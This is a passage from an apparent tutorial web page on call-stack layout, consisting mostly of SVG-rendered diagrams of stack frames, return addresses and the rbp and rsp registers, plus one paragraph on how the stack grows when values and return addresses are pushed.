<text text-anchor='middle' x='8' y='36' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='8' y='276' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='16' y='36' fill='currentColor' style='font-size:1em'>g</text>
<text text-anchor='middle' x='16' y='276' fill='currentColor' style='font-size:1em'>w</text>
<text text-anchor='middle' x='24' y='36' fill='currentColor' style='font-size:1em'>h</text>
<text text-anchor='middle' x='32' y='276' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='40' y='36' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='40' y='276' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='48' y='36' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='48' y='276' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='56' y='36' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='56' y='276' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='64' y='36' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='128' y='36' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='128' y='52' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='128' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='128' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='128' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='128' y='116' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='128' y='132' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='128' y='148' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='128' y='164' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='128' y='180' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='128' y='196' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='128' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='128' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='128' y='244' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='128' y='260' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='128' y='276' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='128' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='128' y='308' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='128' y='324' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='128' y='340' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='128' y='356' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='136' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='132' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='152' y='164' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='152' y='244' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='152' y='276' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='160' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='132' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='160' y='164' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='160' y='244' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='160' y='276' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='168' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='132' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='168' y='164' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='168' y='244' fill='currentColor' style='font-size:1em'>8</text>
<text text-anchor='middle' x='168' y='276' fill='currentColor' style='font-size:1em'>7</text>
<text text-anchor='middle' x='176' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='132' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='176' y='164' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='184' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='132' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='184' y='164' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='192' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='132' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='192' y='164' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='200' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='132' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='208' y='164' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='216' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='132' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='216' y='164' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='224' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='132' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='224' y='164' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='232' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='132' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='232' y='164' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='240' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='132' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='240' y='164' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='248' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='132' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='248' y='164' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='256' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='132' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='256' y='164' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='264' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='132' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='272' y='164' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='280' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='132' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='280' y='164' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='288' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='132' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='296' y='164' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='304' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='132' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='304' y='164' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='312' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='132' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='312' y='164' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='320' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='132' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='320' y='164' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='328' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='132' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='336' y='164' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='344' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='132' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='344' y='164' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='352' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='132' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='352' y='164' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='360' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='360' y='132' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='360' y='164' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='368' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='376' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='384' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='392' y='36' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='392' y='52' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='116' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='132' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='148' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='164' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='180' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='196' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='244' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='260' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='276' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='308' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='324' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='340' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='356' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='400' y='228' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='408' y='164' fill='currentColor' style='font-size:1em'>◄</text>
<text text-anchor='middle' x='408' y='228' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='408' y='276' fill='currentColor' style='font-size:1em'>◄</text>
<text text-anchor='middle' x='416' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='228' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='416' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='228' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='424' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='228' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='432' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='228' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='440' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='228' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='448' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='228' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='456' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='228' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='464' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='228' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='480' y='228' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='488' y='164' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='488' y='228' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='488' y='276' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='496' y='164' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='496' y='228' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='496' y='276' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='504' y='164' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='504' y='228' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='504' y='276' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='512' y='228' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='520' y='228' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='528' y='228' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='536' y='228' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='560' y='196' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='568' y='196' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='576' y='196' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='584' y='196' fill='currentColor' style='font-size:1em'>0</text>
</g>

    </svg>
  
</div>
<p>When more values are pushed to stack, the stack pointer moves more towards lower addresses and the stack frame grows. Here these 2 values are added to stack and then the function is called&hellip;. this will cause the return address to be pushed to stack too (So that control can come back to this location.)</p>



<div class="goat svg-container ">
  
    <svg
      xmlns="http://www.w3.org/2000/svg"
      font-family="Menlo,Lucida Console,monospace"
      
        viewBox="0 0 608 377"
      >
      <g transform='translate(8,16)'>
<path d='M 544,160 L 544,176' fill='none' stroke='currentColor'></path>
<path d='M 544,176 L 544,192' fill='none' stroke='currentColor'></path>
<path d='M 544,192 L 544,208' fill='none' stroke='currentColor'></path>
<circle cx='160' cy='64' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='160' cy='96' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='176' cy='64' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='176' cy='96' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='192' cy='64' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='192' cy='96' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='208' cy='64' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='208' cy='96' r='6' stroke='currentColor' fill='currentColor'></circle>
<text text-anchor='middle' x='8' y='36' fill='currentColor' style='font-size:1em'>h</text>
<text text-anchor='middle' x='16' y='36' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='24' y='36' fill='currentColor' style='font-size:1em'>g</text>
<text text-anchor='middle' x='24' y='276' fill='currentColor' style='font-size:1em'>L</text>
<text text-anchor='middle' x='32' y='36' fill='currentColor' style='font-size:1em'>h</text>
<text text-anchor='middle' x='32' y='276' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='40' y='276' fill='currentColor' style='font-size:1em'>w</text>
<text text-anchor='middle' x='48' y='36' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='56' y='36' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='56' y='276' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='64' y='36' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='64' y='276' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='72' y='36' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='72' y='276' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='80' y='276' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='136' y='36' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='136' y='52' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='136' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='136' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='136' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='136' y='116' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='136' y='132' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='136' y='148' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='136' y='164' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='136' y='180' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='136' y='196' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='136' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='136' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='136' y='244' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='136' y='260' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='136' y='276' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='136' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='136' y='308' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='136' y='324' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='136' y='340' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='136' y='356' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='144' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='132' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='160' y='164' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='160' y='244' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='160' y='276' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='160' y='308' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='168' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='132' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='168' y='164' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='168' y='244' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='168' y='276' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='168' y='308' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='176' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='132' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='176' y='164' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='176' y='244' fill='currentColor' style='font-size:1em'>8</text>
<text text-anchor='middle' x='176' y='276' fill='currentColor' style='font-size:1em'>7</text>
<text text-anchor='middle' x='176' y='308' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='184' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='132' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='184' y='164' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='184' y='308' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='192' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='132' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='192' y='164' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='192' y='308' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='200' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='132' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='200' y='164' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='200' y='308' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='208' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='132' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='216' y='164' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='216' y='308' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='224' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='132' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='224' y='164' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='224' y='308' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='232' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='132' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='232' y='164' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='232' y='308' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='240' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='132' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='240' y='164' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='240' y='308' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='248' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='132' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='248' y='164' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='248' y='308' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='256' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='132' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='256' y='164' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='256' y='308' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='264' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='132' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='264' y='164' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='264' y='308' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='272' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='132' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='280' y='164' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='280' y='308' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='288' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='132' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='288' y='164' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='288' y='308' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='296' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='132' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='304' y='164' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='304' y='308' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='312' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='132' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='312' y='164' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='312' y='308' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='320' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='132' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='320' y='164' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='320' y='308' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='328' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='132' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='328' y='164' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='328' y='308' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='336' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='308' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='344' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='132' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='344' y='164' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='352' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='132' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='352' y='164' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='352' y='308' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='360' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='360' y='132' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='360' y='164' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='360' y='308' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='368' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='368' y='132' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='368' y='164' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='368' y='308' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='376' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='376' y='308' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='384' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='392' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='36' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='400' y='52' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='400' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='400' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='400' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='400' y='116' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='400' y='132' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='400' y='148' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='400' y='164' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='400' y='180' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='400' y='196' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='400' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='400' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='400' y='244' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='400' y='260' fill='currentColor' style='font-size:1em'>│</text>
